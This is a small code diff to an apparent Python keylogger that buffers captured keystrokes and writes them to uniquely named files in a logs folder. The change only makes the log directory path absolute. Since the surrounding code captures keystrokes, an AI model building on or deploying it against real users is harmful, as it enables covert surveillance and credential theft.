@@ -6,7 +6,9 @@ import threading
 from encryptor import encrypt_file
 
 log_buffer = [] # buffer for the keystrokes
-os.makedirs("logs", exist_ok=True)
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+LOG_DIR = os.path.join(BASE_DIR, "logs")
+os.makedirs(LOG_DIR, exist_ok=True)
 
 def key_logger():
     def on_press(key):
@@ -34,7 +36,7 @@ def flush_buffer():
 
     content = "".join(log_buffer)
     unique_id = uuid.uuid4().hex
-    filename = f"logs/{unique_id}.txt"
+    filename = os.path.join(LOG_DIR, f"{unique_id}.txt")
 
     with open(filename, "w") as f:
         f.write(content)
